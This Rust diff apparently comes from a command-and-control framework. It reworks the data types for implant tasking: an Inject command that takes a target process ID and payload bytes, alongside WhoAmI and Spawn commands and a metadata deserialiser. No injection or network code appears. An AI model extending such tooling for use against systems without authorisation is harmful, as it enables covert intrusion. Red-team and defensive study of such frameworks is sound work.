@@ -213,9 +213,18 @@ pub struct DotExInner {
 
 #[derive(Serialize, Deserialize, Clone)]
 #[serde(rename = "1")]
-pub struct InjectInner {
+pub struct InjectInnerForAdmin {
     #[serde(rename = "2")]
-    pub payload: String,
+    pub download_name: String,
+    #[serde(rename = "3")]
+    pub pid: u32,
+}
+
+#[derive(Serialize, Deserialize, Clone)]
+#[serde(rename = "1")]
+pub struct InjectInnerForPayload {
+    #[serde(rename = "2")]
+    pub payload_bytes: Vec<u8>,
     #[serde(rename = "3")]
     pub pid: u32,
 }
@@ -262,7 +271,7 @@ pub enum AdminCommand {
     WhoAmI,
     Spawn(String),
     StaticWof(String),
-    Inject(InjectInner),
+    Inject(InjectInnerForAdmin),
     /// Used for dispatching no admin command, but to be handled via a custom route on the C2
     None,
     Undefined,
@@ -285,6 +294,18 @@ impl Task {
             metadata,
             completed_time: 0,
         }
+    }
+
+    /// Deserialises the incoming data into a `T`, returning `None` if the metadata
+    /// was `None`, and `Ok(T)` / `Err(E)` depending on how the serde_json went
+    pub fn deserialise_metadata<'a, T: Deserialize<'a>>(
+        &'a self,
+    ) -> Option<Result<T, serde_json::Error>> {
+        let Some(ref metadata) = self.metadata else {
+            return None;
+        };
+
+        Some(serde_json::from_str(metadata))
     }
 }
 
